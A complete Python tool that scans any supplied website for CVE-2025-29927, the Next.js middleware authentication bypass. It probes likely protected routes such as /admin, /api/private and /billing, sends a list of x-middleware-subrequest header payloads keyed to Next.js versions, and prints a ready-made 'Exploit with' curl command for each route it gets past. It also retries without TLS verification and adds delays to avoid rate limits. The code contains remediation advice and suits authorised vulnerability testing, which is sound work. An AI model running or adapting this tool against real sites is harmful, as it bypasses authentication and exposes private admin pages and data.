#!/usr/bin/env python3
"""
Optimized scanner for CVE-2025-29927 (Next.js Middleware Bypass Vulnerability)
This tool focuses on redirect behavior to efficiently detect middleware bypass vulnerabilities
"""

import requests
import argparse
import sys
import warnings
import time
import random
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import json

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Import colorful output libraries
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.syntax import Syntax
    from rich.markdown import Markdown
    RICH_AVAILABLE = True
    console = Console()
except ImportError:
    RICH_AVAILABLE = False
    # Colorama fallback
    try:
        from colorama import Fore, Style, init
        init()
    except ImportError:
        # Define dummy colors if colorama is not available
        class DummyColors:
            def __getattr__(self, name):
                return ""
        Fore = DummyColors()
        Style = DummyColors()

# Common protected routes to test
PROTECTED_ROUTES = [
    '/admin',
    '/admin/dashboard',
    '/admin/users',
    '/dashboard',
    '/account',
    '/profile',
    '/settings',
    '/api/admin',
    '/api/users',
    '/api/private',
    '/members',
    '/internal',
    '/manage',
    '/billing',
    '/auth',
    '/login',
    '/portal',
    '/secure',
    '/panel',
    '/user',
    '/console',
    '/backend'
]

# Next.js vulnerability payloads
PAYLOADS = [
    # Standard middleware payloads for different versions
    {"header": "x-middleware-subrequest", "value": "middleware:middleware:middleware:middleware:middleware", 
     "description": "Next.js v13.x-15.1.x (standard location)"},
    
    {"header": "x-middleware-subrequest", "value": "pages/_middleware", 
     "description": "Next.js v11.1.4-12.1.x (pages router)"},
    
    {"header": "x-middleware-subrequest", "value": "middleware", 
     "description": "Next.js v12.2.x (standard location)"},
    
    {"header": "x-middleware-subrequest", "value": "src/middleware", 
     "description": "Next.js v12.2.x (src directory)"},
    
    {"header": "x-middleware-subrequest", "value": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware", 
     "description": "Next.js v13.x-15.1.x (src directory)"},
     
    # App directory variations
    {"header": "x-middleware-subrequest", "value": "app/middleware:app/middleware:app/middleware:app/middleware:app/middleware", 
     "description": "Next.js v13.x+ (app directory)"},
     
    {"header": "x-middleware-subrequest", "value": "src/app/middleware:src/app/middleware:src/app/middleware:src/app/middleware:src/app/middleware", 
     "description": "Next.js v13.x+ (src/app directory)"}
]


class NextJsScanner:
    def __init__(self, verbose=False, threads=5):
        self.verbose = verbose
        self.threads = threads
        self.use_rich = RICH_AVAILABLE
        self.version_hints = {
            "detected": False,
            "version": None,
            "clues": []
        }
    
    def log(self, message, level="info"):
        """Log a message with appropriate formatting"""
        if self.use_rich:
            if level == "info":
                console.print(f"[bold blue][[*]][/] {message}")
            elif level == "success":
                console.print(f"[bold green][[+]][/] {message}")
            elif level == "warning":
                console.print(f"[bold yellow][[!]][/] {message}")
            elif level == "error":
                console.print(f"[bold red][[!]][/] {message}")
        else:
            prefix = {
                "info": f"{Fore.BLUE}[*]{Style.RESET_ALL}",
                "success": f"{Fore.GREEN}[+]{Style.RESET_ALL}",
                "warning": f"{Fore.YELLOW}[!]{Style.RESET_ALL}",
                "error": f"{Fore.RED}[!]{Style.RESET_ALL}"
            }
            print(f"{prefix[level]} {message}")
    
    def verbose_log(self, message, level="info"):
        """Only log when verbose mode is enabled"""
        if self.verbose:
            self.log(message, level)
    
    def auto_ssl_request(self, url, headers=None, timeout=10, max_retries=2, follow_redirects=False):
        """Make HTTP request with automatic SSL verification handling"""
        headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        # First try with SSL verification
        try:
            response = requests.get(url, headers=headers, timeout=timeout, verify=True, allow_redirects=follow_redirects)
            return response
        except requests.exceptions.SSLError:
            self.verbose_log("SSL verification failed, retrying without verification...", "warning")
            try:
                response = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=follow_redirects)
                return response
            except requests.exceptions.RequestException as e:
                self.verbose_log(f"Request failed: {str(e)}", "error")
                return None
        except requests.exceptions.RequestException as e:
            # If not an SSL error but some other error, try once more with verify=False
            if max_retries > 0:
                self.verbose_log(f"Request failed, retrying without SSL verification: {str(e)}", "warning")
                try:
                    response = requests.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=follow_redirects)
                    return response
                except requests.exceptions.RequestException as e:
                    self.verbose_log(f"Request failed: {str(e)}", "error")
                    return None
            else:
                self.verbose_log(f"Request failed: {str(e)}", "error")
                return None
    
    def detect_next_js(self, response):
        """Detect if a response is from a Next.js application"""
        if not response:
            return False
            
        next_indicators = [
            'x-nextjs-data',
            'next-router-state',
            '__NEXT_DATA__',
            '_next/static',
            'next-route-announcer',
            'middleware.ts',
            'middleware.js',
            'pageProps',
            'next-head-count',
            'nextjs',
            'next-font'
        ]
        
        # Check headers
        for header in response.headers:
            if 'next' in header.lower():
                self.version_hints = self.detect_next_js_version(response)
                return True
        
        # Check response content
        for indicator in next_indicators:
            if indicator in response.text:
                self.version_hints = self.detect_next_js_version(response)
                return True
                
        # Check for typical Next.js script patterns
        next_js_patterns = [
            r'_next/static/chunks',
            r'_next/static/[^/]+/_buildManifest\.js',
            r'__next',
            r'__NEXT_DATA__',
            r'next/dist'
        ]
        
        for pattern in next_js_patterns:
            if re.search(pattern, response.text):
                self.version_hints = self.detect_next_js_version(response)
                return True
        
        return False
    
    def detect_next_js_version(self, response):
        """Try to identify the Next.js version from response"""
        results = {
            "detected": False,
            "version": None,
            "clues": []
        }
        
        # Look for version hints in headers
        next_headers = [h for h in response.headers if 'next' in h.lower()]
        if next_headers:
            results["clues"].append(f"Next.js headers found: {', '.join(next_headers)}")
        
        # Check for _next/static patterns that might indicate version
        static_paths_pattern = r'/_next/static/([^/]+)/'
        matches = re.findall(static_paths_pattern, response.text)
        if matches:
            results["clues"].append(f"Static path pattern: {matches[0]}")
        
        # Look for __NEXT_DATA__ which often contains build information
        if '__NEXT_DATA__' in response.text:
            # Try to extract buildId which can hint at version
            build_id_pattern = r'"buildId"\s*:\s*"([^"]+)"'
            build_id_match = re.search(build_id_pattern, response.text)
            if build_id_match:
                results["clues"].append(f"Build ID: {build_id_match.group(1)}")
            
            # Try to extract version number if available
            version_pattern = r'"version"\s*:\s*"([^"]+)"'
            version_match = re.search(version_pattern, response.text)
            if version_match:
                version = version_match.group(1)
                results["detected"] = True
                results["version"] = version
                results["clues"].append(f"Version: {version}")
        
        # Look for chunk naming patterns that indicate version ranges
        if 'webpack-hmr' in response.text:
            results["clues"].append("Webpack HMR detected (likely Next.js 9+)")
        
        if 'webpack-runtime' in response.text:
            results["clues"].append("Webpack runtime detected (likely Next.js 10+)")
        
        if 'buildManifest.js' in response.text:
            results["clues"].append("Build manifest detected (likely Next.js 9+)")
            
        # App router indicators (Next.js 13+)
        if 'appDir' in response.text or 'appRouter' in response.text:
            results["clues"].append("App Router indicators detected (likely Next.js 13+)")
        
        return results
    
    def find_redirecting_routes(self, base_url):
        """Identify routes that redirect (likely protected)"""
        self.log(f"Scanning for protected routes on {base_url}...")
        
        redirecting_routes = []
        all_checked_routes = set()
        
        # Create progress display if Rich is available
        if self.use_rich:
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]Scanning routes..."),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                console=console
            ) as progress:
                task = progress.add_task("Scanning", total=len(PROTECTED_ROUTES))
                
                # Use ThreadPoolExecutor for parallel requests
                with ThreadPoolExecutor(max_workers=self.threads) as executor:
                    future_to_route = {
                        executor.submit(self.check_route_redirect, base_url, route): route 
                        for route in PROTECTED_ROUTES
                    }
                    
                    for future in as_completed(future_to_route):
                        route = future_to_route[future]
                        all_checked_routes.add(route)
                        progress.update(task, advance=1)
                        
                        try:
                            result = future.result()
                            if result:
                                redirecting_routes.append(result)
                                progress.console.print(f"[bold green][[+]][/] Found protected route: {route} → {result['redirect_location']}")
                                
                            # Add a small delay to avoid rate limiting
                            time.sleep(random.uniform(0.1, 0.3))
                        except Exception as e:
                            progress.console.print(f"[bold red][[!]][/] Error checking route {route}: {str(e)}")
        else:
            # Use ThreadPoolExecutor for parallel requests without progress bar
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                future_to_route = {
                    executor.submit(self.check_route_redirect, base_url, route): route 
                    for route in PROTECTED_ROUTES
                }
                
                for future in as_completed(future_to_route):
                    route = future_to_route[future]
                    all_checked_routes.add(route)
                    
                    try:
                        result = future.result()
                        if result:
                            redirecting_routes.append(result)
                            self.log(f"Found protected route: {route} → {result['redirect_location']}", "success")
                            
                        # Add a small delay to avoid rate limiting
                        time.sleep(random.uniform(0.1, 0.3))
                    except Exception as e:
                        self.log(f"Error checking route {route}: {str(e)}", "error")
        
        if not redirecting_routes:
            self.log("No redirecting routes discovered. Will test the base URL only.", "warning")
            # Add home route for testing
            redirecting_routes.append({'route': '/', 'redirect': False, 'status': 200, 'redirect_location': None})
        else:
            self.log(f"Discovered {len(redirecting_routes)} redirecting routes", "success")
        
        return redirecting_routes
    
    def check_route_redirect(self, base_url, route):
        """Check if a route redirects (indicating protection)"""
        url = urljoin(base_url, route)
        
        self.verbose_log(f"Checking route: {route}")
        
        # Make a request without following redirects
        response = self.auto_ssl_request(url)
        if not response:
            return None
        
        status = response.status_code
        
        # Routes that return 401, 403 are definitely protected
        if status in [401, 403]:
            return {
                'route': route,
                'redirect': False,
                'status': status,
                'redirect_location': None
            }
        
        # Routes that redirect might be protected
        if status in [301, 302, 303, 307, 308] and 'location' in response.headers:
            redirect_url = response.headers['location']
            
            # Check if it redirects to a login page or something similar
            auth_terms = ['login', 'signin', 'auth', 'unauthorized']
            if any(auth_term in redirect_url.lower() for auth_term in auth_terms):
                return {
                    'route': route,
                    'redirect': True,
                    'status': status,
                    'redirect_location': redirect_url
                }
            
            # Even if no auth terms, still consider it potentially protected
            return {
                'route': route,
                'redirect': True,
                'status': status,
                'redirect_location': redirect_url
            }
                
        # Check content for login messages on 200 responses
        auth_strings = ['login', 'sign in', 'unauthorized', 'forbidden', 'access denied']
        if status == 200 and any(auth_str in response.text.lower() for auth_str in auth_strings):
            return {
                'route': route,
                'redirect': False,
                'status': status,
                'redirect_location': None,
                'auth_content': True
            }
            
        return None
    
    def test_route_for_vulnerability(self, base_url, route_info):
        """Test a specific route for vulnerability by checking if the payload bypasses redirect"""
        route = route_info['route']
        route_url = urljoin(base_url, route)
        
        self.log(f"Testing route: {route_url}")
        
        # Define baseline info
        baseline = {
            'status': route_info['status'],
            'redirect': route_info['redirect'],
            'redirect_location': route_info.get('redirect_location')
        }
        
        # Test each payload
        vulnerable_payloads = []
        
        # Create progress display if Rich is available
        if self.use_rich and not self.verbose:
            with Progress(
                SpinnerColumn(),
                TextColumn("[bold blue]Testing payloads..."),
                BarColumn(),
                TextColumn("{task.completed}/{task.total}"),
                console=console
            ) as progress:
                task = progress.add_task("Testing", total=len(PAYLOADS))
                
                for payload in PAYLOADS:
                    progress.update(task, advance=1, description=f"Testing {payload['description']}")
                    
                    result = self.test_payload(route_url, payload, baseline)
                    if result['vulnerable']:
                        vulnerable_payloads.append({
                            'payload': payload,
                            'result': result
                        })
                        progress.console.print(f"[bold red][[!]][/] Vulnerable to {payload['description']}")
                        
                        # No need to test more payloads if we've already found vulnerability
                        if not self.verbose:
                            break
                    
                    # Add a small random delay to avoid rate limiting
                    time.sleep(random.uniform(0.2, 0.5))
        else:
            # Test without progress bar
            for payload in PAYLOADS:
                self.verbose_log(f"\nTesting payload: {payload['header']}: {payload['value']}")
                
                result = self.test_payload(route_url, payload, baseline)
                if result['vulnerable']:
                    vulnerable_payloads.append({
                        'payload': payload,
                        'result': result
                    })
                    self.log(f"Vulnerable to {payload['description']}", "error")
                    
                    # No need to test more payloads if we've already found vulnerability
                    if not self.verbose:
                        break
                
                # Add a small random delay to avoid rate limiting
                time.sleep(random.uniform(0.2, 0.5))
        
        return {
            'route': route,
            'baseline': baseline,
            'vulnerable': len(vulnerable_payloads) > 0,
            'vulnerable_payloads': vulnerable_payloads
        }
    
    def test_payload(self, url, payload, baseline):
        """Test a specific payload against a route"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            payload['header']: payload['value']
        }
        
        # Make the request with the payload
        response = self.auto_ssl_request(url, headers, follow_redirects=False)
        
        if not response:
            return {'vulnerable': False, 'reason': 'Request failed'}
        
        self.verbose_log(f"Payload response - Status code: {response.status_code}")
        
        # A route is likely vulnerable if:
        # 1. It previously redirected but now doesn't (status code 200 instead of 30x)
        # 2. It previously returned 401/403 but now returns 200
        # 3. The redirect destination changed significantly
        
        # Check for bypass based on redirect behavior
        if baseline['redirect'] and response.status_code == 200:
            return {
                'vulnerable': True,
                'status': response.status_code,
                'reason': f"Redirect bypassed: {baseline['status']} → 200"
            }
        
        # Check for auth status code bypass
        if baseline['status'] in [401, 403] and response.status_code == 200:
            return {
                'vulnerable': True,
                'status': response.status_code,
                'reason': f"Auth status bypassed: {baseline['status']} → 200"
            }
            
        # Check if redirect location changed
        if (baseline['redirect'] and 
            response.status_code in [301, 302, 303, 307, 308] and 
            'location' in response.headers):
            
            new_location = response.headers['location']
            if baseline['redirect_location'] != new_location:
                # Check if the change is significant (not just a token/timestamp)
                if not self.is_minor_url_difference(baseline['redirect_location'], new_location):
                    return {
                        'vulnerable': True,
                        'status': response.status_code,
                        'reason': f"Redirect location changed: {baseline['redirect_location']} → {new_location}"
                    }
        
        return {'vulnerable': False}
    
    def is_minor_url_difference(self, url1, url2):
        """Check if the difference between URLs is minor (e.g., just a token/timestamp)"""
        # Parse the URLs
        parsed1 = urlparse(url1)
        parsed2 = urlparse(url2)
        
        # If paths differ significantly, it's not a minor difference
        if parsed1.path != parsed2.path:
            return False
            
        # If hostnames differ, it's not a minor difference
        if parsed1.netloc != parsed2.netloc:
            return False
            
        # If schemes differ, it's not a minor difference
        if parsed1.scheme != parsed2.scheme:
            return False
            
        # Otherwise, consider it a minor difference (likely just query params)
        return True
    
    def scan(self, url):
        """Main scanning function"""
        self.log(f"Starting scan of {url} for CVE-2025-29927...")
        
        # Validate URL
        try:
            parsed_url = urlparse(url)
            if not all([parsed_url.scheme, parsed_url.netloc]):
                self.log(f"Invalid URL: {url}", "error")
                return {"vulnerable": False, "error": "Invalid URL"}
        except Exception as e:
            self.log(f"Error parsing URL: {str(e)}", "error")
            return {"vulnerable": False, "error": str(e)}
        
        # Make a baseline request to check if site is up and detect Next.js
        self.log("Making initial request to detect Next.js...")
        base_response = self.auto_ssl_request(url)
        
        if not base_response:
            self.log("Failed to connect to target. Please check the URL and try again.", "error")
            return {"vulnerable": False, "error": "Connection failed"}
            
        # Detect if this is a Next.js application
        is_nextjs = self.detect_next_js(base_response)
        if is_nextjs:
            self.log("Next.js detected!", "success")
            if self.version_hints["detected"]:
                self.log(f"Detected Next.js version: {self.version_hints['version']}", "success")
        else:
            self.log("No Next.js indicators found. The site might not be using Next.js, but testing anyway.", "warning")
        
        # Find redirecting (protected) routes
        redirecting_routes = self.find_redirecting_routes(url)
        
        # Results storage
        results = {
            "vulnerable": False,
            "is_nextjs": is_nextjs,
            "version_hints": self.version_hints,
            "routes_tested": len(redirecting_routes),
            "vulnerable_routes": [],
            "details": {}
        }
        
        # Test each route for vulnerability
        for route_info in redirecting_routes:
            route_result = self.test_route_for_vulnerability(url, route_info)
            
            # Record detailed results
            if route_result['vulnerable']:
                results["vulnerable"] = True
                results["vulnerable_routes"].append({
                    "route": route_result['route'],
                    "payloads": [p['payload']['description'] for p in route_result['vulnerable_payloads']]
                })
                results["details"][route_result['route']] = route_result
                
                self.log(f"Route {route_result['route']} is VULNERABLE!", "error")
                
                # Display first working payload
                if route_result['vulnerable_payloads']:
                    working_payload = route_result['vulnerable_payloads'][0]['payload']
                    self.log(f"Vulnerable to: {working_payload['description']}", "error")
                    self.log(f"Header: {working_payload['header']}: {working_payload['value']}", "error")
                    
                    # Show curl command for exploitation
                    exploit_url = urljoin(url, route_result['route'])
                    curl_cmd = f"curl -i -H '{working_payload['header']}: {working_payload['value']}' {exploit_url}"
                    self.log("\nExploit with:", "success")
                    if self.use_rich:
                        console.print(f"[dim]{curl_cmd}[/]")
                    else:
                        print(curl_cmd)
        
        # Summary
        if results["vulnerable"]:
            self.log("\nVULNERABLE! The application is affected by CVE-2025-29927", "error")
            self.log(f"Found {len(results['vulnerable_routes'])} vulnerable routes", "error")
        else:
            self.log("\nNot vulnerable. No signs of CVE-2025-29927 detected.", "success")
            
        return results
    
    def generate_report(self, results, url, output_file=None):
        """Generate a comprehensive report of the scan results"""
        if not results:
            self.log("No results to report", "error")
            return
            
        if self.use_rich:
            # Create a title panel
            title_panel = Panel(
                f"[bold]CVE-2025-29927 Scan Report for {url}[/]",
                border_style="blue"
            )
            console.print(title_panel)

            # Summary section
            console.print("\n[bold yellow]SUMMARY:[/]")
            summary_table = Table(show_header=False)
            summary_table.add_column("Property", style="bold")
            summary_table.add_column("Value")

            summary_table.add_row("Target", url)
            summary_table.add_row("Next.js Detected", "Yes" if results['is_nextjs'] else "No")

            if results["version_hints"]["detected"]:
                version_text = f"Yes (v{results['version_hints']['version']})"
                summary_table.add_row("Version Detected", version_text)

            summary_table.add_row("Routes Tested", str(results['routes_tested']))
            summary_table.add_row("Vulnerable", "[bold red]Yes[/]" if results['vulnerable'] else "[bold green]No[/]")

            console.print(summary_table)

            # Show version clues if available
            if results["version_hints"]["clues"]:
                console.print("\n[bold blue]VERSION DETECTION CLUES:[/]")
                for clue in results["version_hints"]["clues"]:
                    console.print(f"  • {clue}")

            # Vulnerability details if vulnerable
            if results["vulnerable"]:
                console.print("\n[bold red]VULNERABILITY DETAILS:[/]")

                for vuln_route in results["vulnerable_routes"]:
                    route = vuln_route["route"]
                    console.print(f"\n[bold]Route:[/] {route}")
                    console.print("[bold]Vulnerable to:[/]")
                    for payload in vuln_route["payloads"]:
                        console.print(f"  • {payload}")
                    
                    # If we have details, show the first working exploit
                    if route in results["details"] and results["details"][route]["vulnerable_payloads"]:
                        working_payload = results["details"][route]["vulnerable_payloads"][0]["payload"]
                        
                        # Show curl command
                        exploit_url = urljoin(url, route)
                        curl_cmd = f"curl -i -H '{working_payload['header']}: {working_payload['value']}' {exploit_url}"
                        console.print("\n[bold green]EXPLOIT COMMAND:[/]")
                        console.print(f"[dim]{curl_cmd}[/]")
            
            # Remediation advice
            console.print("\n[bold yellow]REMEDIATION:[/]")
            remediation_text = """
1. Update to patched versions:
   - For Next.js 15.x: Update to v15.2.3 or newer
   - For Next.js 14.x: Update to v14.2.25 or newer
2. If updating is not possible, block the x-middleware-subrequest header at the web server/proxy level
            """
            console.print(Markdown(remediation_text))
        else:
            # Simple text-based report
            print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}CVE-2025-29927 SCAN REPORT FOR {url}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")

            print(f"\n{Fore.YELLOW}SUMMARY:{Style.RESET_ALL}")
            print(f"  Target: {url}")
            print(f"  Next.js Detected: {'Yes' if results['is_nextjs'] else 'No'}")

            if results["version_hints"]["detected"]:
                print(f"  Version Detected: Yes (v{results['version_hints']['version']})")

            print(f"  Routes Tested: {results['routes_tested']}")
            print(f"  Vulnerable: {'Yes' if results['vulnerable'] else 'No'}")

            # Show version clues if available
            if results["version_hints"]["clues"]:
                print(f"\n{Fore.BLUE}VERSION DETECTION CLUES:{Style.RESET_ALL}")
                for clue in results["version_hints"]["clues"]:
                    print(f"  - {clue}")

            # Vulnerability details if vulnerable
            if results["vulnerable"]:
                print(f"\n{Fore.RED}VULNERABILITY DETAILS:{Style.RESET_ALL}")

                for vuln_route in results["vulnerable_routes"]:
                    route = vuln_route["route"]
                    print(f"\n  Route: {route}")
                    print("  Vulnerable to:")
                    for payload in vuln_route["payloads"]:
                        print(f"    - {payload}")
                    
                    # If we have details, show the first working exploit
                    if route in results["details"] and results["details"][route]["vulnerable_payloads"]:
                        working_payload = results["details"][route]["vulnerable_payloads"][0]["payload"]
                        
                        # Show curl command
                        exploit_url = urljoin(url, route)
                        curl_cmd = f"curl -i -H '{working_payload['header']}: {working_payload['value']}' {exploit_url}"
                        print(f"\n{Fore.GREEN}EXPLOIT COMMAND:{Style.RESET_ALL}")
                        print(f"  {curl_cmd}")

            # Remediation advice
            print(f"\n{Fore.YELLOW}REMEDIATION:{Style.RESET_ALL}")
            print(f"  1. Update to patched versions:")
            print(f"     - For Next.js 15.x: Update to v15.2.3 or newer")
            print(f"     - For Next.js 14.x: Update to v14.2.25 or newer")
            print(f"  2. If updating is not possible, block the x-middleware-subrequest header at the web server/proxy level")

        # Save report to file if requested
        if output_file and results:
            try:
                # Save detailed JSON results
                with open(output_file, 'w') as f:
                    json.dump(results, f, indent=2)
                self.log(f"Detailed results saved to {output_file}", "success")
                
                # Also save a human-readable report
                if '.' in output_file:
                    base, ext = output_file.rsplit('.', 1)
                    txt_file = f"{base}_report.txt"
                else:
                    txt_file = f"{output_file}_report.txt"

                with open(txt_file, 'w') as f:
                    f.write(f"CVE-2025-29927 Scan Report for {url}\n")
                    f.write(f"{'='*60}\n\n")

                    f.write("SUMMARY:\n")
                    f.write(f"  Target: {url}\n")
                    f.write(f"  Next.js Detected: {'Yes' if results['is_nextjs'] else 'No'}\n")

                    if results["version_hints"]["detected"]:
                        f.write(f"  Version Detected: Yes (v{results['version_hints']['version']})\n")

                    f.write(f"  Routes Tested: {results['routes_tested']}\n")
                    f.write(f"  Vulnerable: {'Yes' if results['vulnerable'] else 'No'}\n\n")

                    if results["vulnerable"]:
                        f.write("VULNERABILITY DETAILS:\n")
                        for vuln_route in results["vulnerable_routes"]:
                            route = vuln_route["route"]
                            f.write(f"\n  Route: {route}\n")
                            f.write("  Vulnerable to:\n")
                            for payload in vuln_route["payloads"]:
                                f.write(f"    - {payload}\n")
                
                self.log(f"Human-readable report saved to {txt_file}", "success")
            except Exception as e:
                self.log(f"Error saving results: {str(e)}", "error")

def main():
    """Main function to run the scanner"""
    parser = argparse.ArgumentParser(
        description='Optimized scanner for CVE-2025-29927 (Next.js Middleware Bypass Vulnerability)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic scan of a website
  python nextjs_scanner.py example.com
  
  # Verbose scan
  python nextjs_scanner.py example.com -v
  
  # Save results to a file
  python nextjs_scanner.py example.com -o results.json
  """
    )
    
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Number of threads for scanning (default: 5)')
    parser.add_argument('--no-rich', action='store_true', help='Disable rich output and use simple terminal output')
    
    args = parser.parse_args()
    
    # Override Rich availability if requested
    global RICH_AVAILABLE
    if args.no_rich:
        RICH_AVAILABLE = False
    
    # If URL doesn't start with http:// or https://, add https://
    url = args.url
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
        if RICH_AVAILABLE:
            console.print(f"[yellow]URL modified to: {url}[/]")
        else:
            print(f"{Fore.YELLOW}[*] URL modified to: {url}{Style.RESET_ALL}")
    
    # Create scanner instance
    scanner = NextJsScanner(
        verbose=args.verbose, 
        threads=args.threads
    )
    
    # Run the scan
    results = scanner.scan(url)
    
    # Generate report
    scanner.generate_report(results, url, args.output)
    
    # Exit with appropriate status code
    sys.exit(0 if not results["vulnerable"] else 1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        if RICH_AVAILABLE:
            console.print("\n[bold red]Scan interrupted by user![/]")
        else:
            print(f"\n{Fore.RED}[!] Scan interrupted by user!{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        if RICH_AVAILABLE:
            console.print(f"[bold red]Error: {str(e)}[/]")
            import traceback
            console.print("[dim]" + traceback.format_exc() + "[/]")
        else:
            print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
            import traceback
            print(traceback.format_exc())
        sys.exit(1)
